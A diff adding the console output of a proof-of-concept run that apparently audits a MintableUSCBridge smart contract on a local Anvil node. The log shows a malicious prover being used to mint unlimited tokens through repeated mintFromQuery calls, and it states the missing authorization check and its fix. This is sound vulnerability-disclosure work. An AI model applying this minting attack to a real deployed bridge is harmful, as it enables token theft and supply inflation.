@@ -1,0 +1,31 @@
+============================================================
+PoC: MintableUSCBridge — Unlimited Token Minting
+============================================================
+
+[1/3] Starting local Anvil node...
+      Anvil running at http://127.0.0.1:8545
+
+[2/3] Running forge script (deploy + attack)...
+
+  [deploy] ConcreteUSCBridge: 0x5FbDB2315678afecb367f032d93F642f64180aa3
+  [deploy] MaliciousProver:   0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512
+  [pre]    attacker balance:  0 tokens
+  [pre]    total supply:      0 tokens
+  [call1]  mintFromQuery(maliciousProver, nonce_1)  ->  1,000,000 tokens minted
+  [call2]  mintFromQuery(maliciousProver, nonce_2)  ->  1,000,000 tokens minted
+  === ATTACK CONFIRMED ===
+  Attacker balance: 2000000 tokens
+  Total supply:     2000000 tokens
+  Root cause: mintFromQuery never checks queryDetails.principal.
+  Fix:        require(hasRole(DEFAULT_ADMIN_ROLE, queryDetails.principal))
+
+[3/3] RESULT: forge script exited successfully
+
+VULNERABILITY CONFIRMED:
+  mintFromQuery(maliciousProver, freshQueryId) mints unlimited tokens.
+  Repeated calls with different queryIds inflate supply without bound.
+
+Missing check (present in UniversalBridgeProxy, absent in MintableUSCBridge):
+  require(hasRole(DEFAULT_ADMIN_ROLE, queryDetails.principal))
+
+Anvil stopped.
